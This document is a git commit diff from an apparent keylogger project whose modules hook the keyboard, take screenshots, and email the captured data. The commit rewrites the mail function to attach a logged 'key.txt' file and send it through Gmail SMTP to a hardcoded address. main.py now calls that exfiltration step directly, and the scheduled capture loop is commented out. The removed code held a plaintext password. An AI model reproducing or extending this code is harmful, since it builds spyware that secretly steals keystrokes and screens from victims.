b10318cc2ad9ec20cab6d80c8c0f93fe178cd3ee
Xendorium <akama23@wp.pl>
2024-01-04 00:03:02 +0100

    Screens

--- Email_Connection.py
+++ Email_Connection.py
@@ -1,27 +1,50 @@
 import smtplib
-import ssl
 import os
-
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 path = os.path.dirname(os.path.abspath(__file__))
 script_path_key = os.path.join(path, 'key.txt')
 
 
 def sendmail():
-    smtp_server = "smyp.gmail.com"
-    port = 587
-    sender_email = "Xendorium@gmail.com"
-    password = "Xendorium123"
-    receiver_email = "Xendorium@gmail.com"
-    contex = ssl.create_default_context()
-    msg = "Hello"
+    sender = "Jan.Adamczewski.Pawel@gmail.com"
+    receiver = sender
+    password = ""
+    body = "Data: "
+
+    msg = MIMEMultipart()
+
+    msg.attach(MIMEText(body, 'plain'))
+    file = script_path_key
+    with open(file, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", f"attachment; filename={file}")
+    msg.attach(part)
     try:
-        server = smtplib.SMTP(smtp_server, port)
-        server.starttls(context=contex)
-        server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, msg)
-    except Exception as e:
-        print(e)
-    finally:
-        server.quit()
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.ehlo()
+        server.login(sender, password)
+        server.sendmail(sender, receiver, msg.as_string())
+        server.close()
+        return True
+    except Exception as error:
+        print(error)
+        return False
+
+
+
+
+
+
+
+
+
+
+
 
--- main.py
+++ main.py
@@ -1,12 +1,13 @@
 import Hook_Keyboard
 import PrintScreen
 import schedule
+import Email_Connection
 
-
-schedule.every(1).minutes.do(PrintScreen.take_screen)
-while True:
-    Hook_Keyboard.hook_keyboard()
-    schedule.run_pending()
-
+# schedule.every(1).minutes.do(PrintScreen.take_screen)
+# schedule.every(10).minutes.do(Email_Connection.sendmail())
+# while True:
+#     Hook_Keyboard.hook_keyboard()
+#     schedule.run_pending()
+Email_Connection.sendmail()
 
 
